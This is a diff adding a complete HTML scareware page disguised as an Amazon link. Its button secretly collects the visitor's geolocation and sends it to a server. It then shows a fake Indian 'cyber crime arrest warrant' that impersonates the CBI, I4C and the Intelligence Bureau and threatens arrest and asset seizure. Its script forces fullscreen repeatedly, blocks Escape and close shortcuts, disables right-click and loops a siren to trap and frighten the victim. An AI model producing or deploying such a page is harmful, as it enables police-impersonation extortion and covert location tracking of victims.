@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon</title>
+    <link rel="icon" type="image/png" href="/amazon.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Times New Roman', serif;
+            background: #fff;
+            color: #000;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        
+        .button-container {
+            text-align: center;
+            padding: 50px 20px;
+        }
+        
+        .amazon-button {
+            background: #FF9900;
+            color: white;
+            padding: 20px 50px;
+            font-size: 24px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            transition: transform 0.2s;
+        }
+        
+        .amazon-button:hover {
+            transform: scale(1.05);
+        }
+        
+        .warrant-page {
+            display: none;
+            max-width: 210mm;
+            margin: 0 auto;
+            padding: 30px;
+            background: white;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        
+        .warrant-page.active {
+            display: block;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 30px;
+            border-bottom: 3px solid #000;
+            padding-bottom: 20px;
+        }
+        
+        .logo-left {
+            text-align: center;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .logo-center {
+            text-align: center;
+            flex: 2;
+        }
+        
+        .logo-right {
+            text-align: center;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .header img {
+            display: block;
+        }
+        
+        .logo-center h1 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #1a4780;
+        }
+        
+        .address {
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        
+        .main-content {
+            margin: 30px 0;
+        }
+        
+        .main-content p {
+            margin-bottom: 15px;
+            text-align: justify;
+            font-size: 14px;
+        }
+        
+        .offenses {
+            margin: 20px 0;
+            padding: 15px;
+            background: #fff3cd;
+            border-left: 5px solid #dc3545;
+        }
+        
+        .offenses h3 {
+            color: #dc3545;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .offenses ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .offenses li {
+            color: #dc3545;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 8px 0;
+            padding-left: 20px;
+        }
+        
+        .offenses li:before {
+            content: "** ";
+            color: #dc3545;
+        }
+        
+        .details-box {
+            background: #f8f9fa;
+            border: 2px solid #000;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        
+        .details-box h3 {
+            margin-bottom: 15px;
+            color: #dc3545;
+            font-size: 16px;
+        }
+        
+        .details-box p {
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .details-box .label {
+            font-weight: bold;
+        }
+        
+        .location-focus {
+            background: #dc3545;
+            color: white;
+            padding: 25px;
+            margin: 25px 0;
+            border: 3px solid #000;
+            text-align: center;
+        }
+        
+        .location-label {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .location-display {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 15px 0;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        
+        .location-display-inline {
+            font-weight: bold;
+            font-size: 16px;
+            color: #dc3545;
+            text-transform: uppercase;
+        }
+        
+        
+        .warning-text {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 20px;
+            margin: 25px 0;
+            font-weight: bold;
+            text-align: center;
+            font-size: 15px;
+        }
+        
+        .signatures {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 50px;
+            padding-top: 30px;
+            border-top: 2px solid #000;
+        }
+        
+        .signature {
+            text-align: center;
+            flex: 1;
+        }
+        
+        .signature-name {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+        
+        .signature-title {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            padding-top: 20px;
+            border-top: 1px solid #ccc;
+        }
+        
+        @media print {
+            .button-container {
+                display: none;
+            }
+            .warrant-page {
+                display: block !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="button-container" id="buttonContainer">
+        <button class="amazon-button" onclick="showWarrantAndFullscreen()">Go to amazon.com</button>
+    </div>
+    
+    <div class="warrant-page" id="warrantPage">
+        <div class="header">
+            <div class="logo-left">
+                <img src="/police.jpg" alt="Police" style="max-width: 150px; max-height: 100px; object-fit: contain;">
+            </div>
+            <div class="logo-center">
+                <img src="/cyber_police.jpg" alt="Cyber Police" style="max-width: 300px; max-height: 120px; object-fit: contain; margin: 0 auto; display: block;">
+                <div class="address">5th Floor, NDCC-II Building, Jai Singh Road, New Delhi - India</div>
+            </div>
+            <div class="logo-right">
+                <img src="/police.jpg" alt="Police" style="max-width: 150px; max-height: 100px; object-fit: contain;">
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <p><strong>CYBER CRIME ARREST WARRANT</strong></p>
+            
+            <p>By the mandate of Shri. Rajesh Kumar, CEO of the Indian Cyber Crime Coordination Centre: in partnership with Central Bureau of Investigation (CBI) which is the National Nodal Agency for INTERPOL in India; I, hereby notify you of a computerized seizure of Cyber-infiltration captured on your internet protocol address (IP) in relation to the following analysis:-</p>
+            
+            <div class="offenses">
+                <h3>CHARGES:</h3>
+                <ul>
+                    <li>ONLINE SCAM</li>
+                    <li>CYBER FRAUD</li>
+                    <li>IDENTITY THEFT</li>
+                    <li>FINANCIAL FRAUD</li>
+                    <li>ILLEGAL CYBER ACTIVITIES</li>
+                </ul>
+            </div>
+            
+            <div class="details-box">
+                <h3>EVIDENCE COLLECTED:</h3>
+                <p><span class="label">Your IP Address:</span> <span id="ipAddress">Loading...</span></p>
+                <div class="location-focus">
+                    <p class="location-label">YOUR CURRENT LOCATION:</p>
+                    <p class="location-display" id="location">Loading location...</p>
+                </div>
+                <p><span class="label">Access Time:</span> <span id="accessTime">Recorded</span></p>
+            </div>
+            
+            <p><strong>DEVICE INFORMATION:</strong></p>
+            <p>All device details including browser information, system specifications, hardware details, and digital fingerprints have been recorded and logged in our database.</p>
+            
+            <p><strong>DEVICE CONFISCATION:</strong></p>
+            <p>As part of the investigation and legal proceedings, your device (computer, mobile phone, or tablet) will be confiscated by law enforcement authorities when they arrive at your location. This device will be used as evidence in the case against you.</p>
+            
+            <p>The Criminal Code Of India Section 420 (Cheating), Section 468 (Forgery), Section 471 (Using forged documents), and Section 66C, 66D of the Information Technology Act, 2000 criminalizes online fraud, scam, and cybercrime activities and is punishable by imprisonment up to 7 years and fine.</p>
+            
+            <div class="warning-text">
+                ⚠️ WARNING: Based on the evidence collected from your device and network, Indian Cyber Crime Coordination Centre (I4C) and Central Bureau of Investigation (CBI) have identified your involvement in online scam and fraud activities.
+            </div>
+            
+            <p><strong>ARREST WARRANT:</strong></p>
+            <p>With immediate effect, an arrest warrant has been issued in your name. Police officers from your nearest police station will be dispatched to your location (<span class="location-display-inline" id="location2">recorded location</span>) within 24-48 hours to execute this warrant.</p>
+            
+            <p><strong>ASSET CONFISCATION:</strong></p>
+            <p>All your assets including bank accounts, property, vehicles, and digital assets will be frozen and confiscated pending investigation. Your financial accounts have been flagged for immediate review.</p>
+            
+            <p><strong>IMMEDIATE ACTION REQUIRED:</strong></p>
+            <p>Failure to respond within 24 hours, the prosecutor will establish an arrest warrant against you through the closest Police Station. After prosecution, your information will be sent to the National Cyber Crime Registry and to the Media for publication.</p>
+            
+            <p style="font-weight: bold; text-align: center; margin-top: 30px; font-size: 16px;">RESPOND IMMEDIATELY</p>
+        </div>
+        
+        <div class="signatures">
+            <div class="signature">
+                <div class="signature-name">Tapan Deka</div>
+                <div class="signature-title">Director of the Intelligence Bureau</div>
+            </div>
+            <div class="signature">
+                <div class="signature-name">Shri Rajesh Kumar</div>
+                <div class="signature-title">CEO, Indian Cyber Crime Coordination Centre</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            5th Floor, NDCC-II Building, Jai Singh Road, New Delhi - India
+        </div>
+    </div>
+    
+    <audio id="sirenAudio" loop>
+        <source src="/siren.mp3" type="audio/mpeg">
+    </audio>
+    
+    <script>
+        // Get location from IP address using geolocation API
+        async function getLocationFromIP(ip) {
+            if (!ip || ip === 'XXX.XXX.XXX.XXX' || ip === 'Unknown') {
+                return null;
+            }
+            
+            try {
+                // Try HTTPS first (ip-api.com doesn't support HTTPS on free tier, so we'll use alternative)
+                // Using ipapi.co which supports HTTPS
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                if (data.city && data.region) {
+                    return `${data.city}, ${data.region}, ${data.country_name || data.country}`;
+                } else if (data.city) {
+                    return `${data.city}, ${data.country_name || data.country}`;
+                }
+                // Fallback to ip-api.com (HTTP) if needed
+                try {
+                    const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,region,country`);
+                    const data2 = await response2.json();
+                    if (data2.status === 'success' && data2.city && data2.region) {
+                        return `${data2.city}, ${data2.region}, ${data2.country}`;
+                    }
+                } catch (e) {
+                    // Ignore fallback errors
+                }
+                return null;
+            } catch (error) {
+                console.error('IP geolocation error:', error);
+                // Try HTTP fallback
+                try {
+                    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,region,country`);
+                    const data = await response.json();
+                    if (data.status === 'success' && data.city && data.region) {
+                        return `${data.city}, ${data.region}, ${data.country}`;
+                    }
+                } catch (e) {
+                    return null;
+                }
+                return null;
+            }
+        }
+        
+        // Get data from URL parameters or localStorage
+        async function getStoredData() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let ip = urlParams.get('ip') || localStorage.getItem('recordedIP');
+            
+            // If no IP, try to get it from server
+            if (!ip) {
+                try {
+                    const res = await fetch('/api/last-ip');
+                    const data = await res.json();
+                    if (data.ip) {
+                        ip = data.ip;
+                        localStorage.setItem('recordedIP', ip);
+                    }
+                } catch (error) {
+                    console.error('Failed to fetch IP:', error);
+                }
+            }
+            
+            ip = ip || 'XXX.XXX.XXX.XXX';
+            document.getElementById('ipAddress').textContent = ip;
+            
+            // Get location - prefer stored location, fallback to IP geolocation
+            let location = urlParams.get('location') || localStorage.getItem('recordedLocation');
+            
+            // If location is just coordinates or not available, use IP geolocation
+            if (!location || location.includes('Not available') || /^-?\d+\.\d+,\s*-?\d+\.\d+/.test(location)) {
+                const ipLocation = await getLocationFromIP(ip);
+                if (ipLocation) {
+                    location = ipLocation;
+                    localStorage.setItem('recordedLocation', location);
+                } else {
+                    location = location || 'LOCATION TRACKED';
+                }
+            }
+            
+            const deviceInfo = urlParams.get('device') || localStorage.getItem('deviceInfo') || 'Device information recorded';
+            const accessTime = urlParams.get('time') || localStorage.getItem('accessTime') || new Date().toLocaleString();
+            
+            return { ip, location, deviceInfo, accessTime };
+        }
+        
+        // Display stored data
+        async function displayData() {
+            const data = await getStoredData();
+            // Location will be updated when button is clicked and permission is granted/denied
+            const storedLocation = localStorage.getItem('recordedLocation');
+            if (storedLocation) {
+                document.getElementById('location').textContent = storedLocation;
+                document.getElementById('location2').textContent = storedLocation;
+            } else {
+                document.getElementById('location').textContent = data.location;
+                document.getElementById('location2').textContent = data.location;
+            }
+            document.getElementById('accessTime').textContent = data.accessTime;
+        }
+        
+        // Initialize data display
+        displayData();
+        
+        // Fullscreen request function
+        function requestFullscreen() {
+            const element = document.documentElement;
+            
+            if (element.requestFullscreen) {
+                element.requestFullscreen().catch(err => {
+                    console.log('Fullscreen error:', err);
+                });
+            } else if (element.webkitRequestFullscreen) {
+                element.webkitRequestFullscreen();
+            } else if (element.webkitRequestFullScreen) {
+                element.webkitRequestFullScreen();
+            } else if (element.mozRequestFullScreen) {
+                element.mozRequestFullScreen();
+            } else if (element.msRequestFullscreen) {
+                element.msRequestFullscreen();
+            }
+        }
+        
+        // Aggressive fullscreen re-entry
+        function attemptFullscreen() {
+            requestFullscreen();
+            const delays = [50, 100, 200, 300, 500, 750, 1000];
+            delays.forEach(delay => {
+                setTimeout(() => requestFullscreen(), delay);
+            });
+        }
+        
+        // Request location permission and then show warrant
+        async function showWarrantAndFullscreen() {
+            let locationGranted = false;
+            let finalLocation = null;
+            
+            // Request location permission
+            if (navigator.geolocation) {
+                try {
+                    const location = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                resolve({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude
+                                });
+                            },
+                            (error) => {
+                                reject(error);
+                            },
+                            {
+                                enableHighAccuracy: false,
+                                timeout: 10000,
+                                maximumAge: 0
+                            }
+                        );
+                    });
+                    
+                    locationGranted = true;
+                    finalLocation = `${location.latitude}, ${location.longitude}`;
+                    
+                    // Store location for sending to sheet
+                    localStorage.setItem('recordedLocation', finalLocation);
+                    
+                    // Send location to server
+                    fetch('/api/store-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ location: finalLocation, source: 'browser' })
+                    }).catch(err => console.error('Location save error:', err));
+                    
+                } catch (error) {
+                    console.log('Location permission denied or error:', error);
+                    locationGranted = false;
+                }
+            }
+            
+            // If location not granted, use IP-based location
+            if (!locationGranted) {
+                const ip = localStorage.getItem('recordedIP') || document.getElementById('ipAddress')?.textContent || 'XXX.XXX.XXX.XXX';
+                if (ip && ip !== 'XXX.XXX.XXX.XXX' && ip !== 'Loading...') {
+                    const ipLocation = await getLocationFromIP(ip);
+                    if (ipLocation) {
+                        finalLocation = ipLocation;
+                        localStorage.setItem('recordedLocation', finalLocation);
+                        
+                        // Send IP-based location to server
+                        fetch('/api/store-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ location: finalLocation, source: 'ip' })
+                        }).catch(err => console.error('Location save error:', err));
+                    }
+                }
+            }
+            
+            // Update location display if we have it
+            if (finalLocation) {
+                document.getElementById('location').textContent = finalLocation;
+                document.getElementById('location2').textContent = finalLocation;
+            }
+            
+            // Hide button container
+            document.getElementById('buttonContainer').style.display = 'none';
+            
+            // Show warrant page
+            document.getElementById('warrantPage').classList.add('active');
+            
+            // Enter fullscreen
+            attemptFullscreen();
+            
+            // Play siren at maximum volume (browsers limit to 1.0)
+            const audio = document.getElementById('sirenAudio');
+            audio.volume = 1.0; // Maximum allowed volume (browsers cap at 1.0)
+            
+            // Try to play immediately
+            audio.play().catch(err => {
+                console.log('Audio play error, will retry on interaction:', err);
+                // Auto-retry on any user interaction since fullscreen requires interaction
+                const playAudio = () => {
+                    audio.volume = 1.0;
+                    audio.play().catch(e => console.log('Audio play failed:', e));
+                };
+                
+                // Try on various events
+                ['click', 'touchstart', 'keydown'].forEach(eventType => {
+                    document.addEventListener(eventType, playAudio, { once: true });
+                });
+            });
+        }
+        
+        // Re-enter fullscreen if exited
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                attemptFullscreen();
+            }
+        });
+        
+        document.addEventListener('webkitfullscreenchange', () => {
+            if (!document.webkitFullscreenElement) {
+                attemptFullscreen();
+            }
+        });
+        
+        document.addEventListener('mozfullscreenchange', () => {
+            if (!document.mozFullScreenElement) {
+                attemptFullscreen();
+            }
+        });
+        
+        document.addEventListener('MSFullscreenChange', () => {
+            if (!document.msFullscreenElement) {
+                attemptFullscreen();
+            }
+        });
+        
+        // Continuous fullscreen maintenance
+        setInterval(() => {
+            if (!document.fullscreenElement && 
+                !document.webkitFullscreenElement && 
+                !document.mozFullScreenElement && 
+                !document.msFullscreenElement) {
+                if (document.getElementById('warrantPage').classList.contains('active')) {
+                    attemptFullscreen();
+                }
+            }
+        }, 500);
+        
+        // Block keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F11' || e.key === 'Escape' || 
+                (e.key === 'F4' && e.altKey) ||
+                (e.key === 'w' && e.ctrlKey) ||
+                (e.key === 'q' && e.ctrlKey)) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, true);
+        
+        // Prevent context menu
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            return false;
+        });
+    </script>
+</body>
+</html>
